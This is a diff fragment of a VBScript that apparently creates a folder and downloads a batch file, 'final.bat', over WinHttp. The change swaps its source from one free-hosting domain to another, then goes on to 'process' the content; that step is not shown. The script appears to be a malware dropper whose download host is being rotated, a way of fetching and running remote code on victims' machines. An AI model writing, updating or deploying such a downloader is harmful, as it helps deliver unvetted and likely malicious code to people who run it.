@@ -28,7 +28,7 @@ fso.CreateFolder folderPath
 
 ' Download the file
 Set xmlHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
-xmlHttp.Open "GET", "https://fancy-seehorse.netlify.app/code/final.bat", False
+xmlHttp.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False
 xmlHttp.Send
 
 ' Process the downloaded content
